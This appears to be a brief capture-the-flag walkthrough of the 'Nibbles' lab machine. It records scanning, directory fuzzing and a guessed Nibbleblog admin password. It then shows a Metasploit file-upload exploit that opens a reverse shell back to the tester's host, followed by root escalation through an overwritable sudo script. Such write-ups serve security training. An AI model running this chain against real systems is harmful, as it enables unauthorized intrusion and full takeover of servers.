nmap
```
$ sudo nmap -sC -sV 10.10.10.75 -Pn

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Nmap scan report for 10.10.10.75
Host is up (0.034s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

view src: 

/nibbleblog/ directory. Nothing interesting here!

fuff 
```
$ ffuf -w /usr/share/dirb/wordlists/big.txt -u http://10.10.10.75/nibbleblog/FUZZ

.htaccess               [Status: 403, Size: 306, Words: 22, Lines: 12]
.htpasswd               [Status: 403, Size: 306, Words: 22, Lines: 12]
README                  [Status: 200, Size: 4628, Words: 589, Lines: 64]
admin                   [Status: 301, Size: 321, Words: 20, Lines: 10]
content                 [Status: 301, Size: 323, Words: 20, Lines: 10]
languages               [Status: 301, Size: 325, Words: 20, Lines: 10]
plugins                 [Status: 301, Size: 323, Words: 20, Lines: 10]
themes                  [Status: 301, Size: 322, Words: 20, Lines: 10]

$ ffuf -w /usr/share/dirb/wordlists/big.txt -u http://10.10.10.75/nibbleblog/FUZZ.php

.htaccess               [Status: 403, Size: 310, Words: 22, Lines: 12]
.htpasswd               [Status: 403, Size: 310, Words: 22, Lines: 12]
admin                   [Status: 200, Size: 1401, Words: 79, Lines: 27]
feed                    [Status: 200, Size: 302, Words: 8, Lines: 8]
index                   [Status: 200, Size: 2987, Words: 116, Lines: 61]
install                 [Status: 200, Size: 78, Words: 11, Lines: 1]
sitemap                 [Status: 200, Size: 402, Words: 33, Lines: 11]
update                  [Status: 200, Size: 1622, Words: 103, Lines: 88]
```

nibbleblog creds: username found in /content/private/users.xml, password guessed (box name)

`admin:nibbles`

exploit: metasploit
```
msfconsole

msf6 > search nibbleblog

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability

use exploit/multi/http/nibbleblog_file_upload
set RHOSTS 10.10.10.75
set USERNAME admin
set PASSWORD nibbles
set TARGETURI /nibbleblog/
set LHOST tun0

[*] Started reverse TCP handler on 10.10.14.18:4444 
[*] Sending stage (39282 bytes) to 10.10.10.75
[+] Deleted image.php

meterpreter > shell

python3 -c 'import pty;pty.spawn("/bin/bash")'

nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ id

uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)

nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cd ~

nibbler@Nibbles:/home/nibbler$ ls

personal.zip  user.txt

nibbler@Nibbles:/home/nibbler$ unzip personal.zip

unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh 

nibbler@Nibbles:/home/nibbler$ cd personal/stuff

nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo -l

Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "/bin/bash" > monitor.sh

<er/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh     

root@Nibbles:/home/nibbler/personal/stuff# id

uid=0(root) gid=0(root) groups=0(root)
```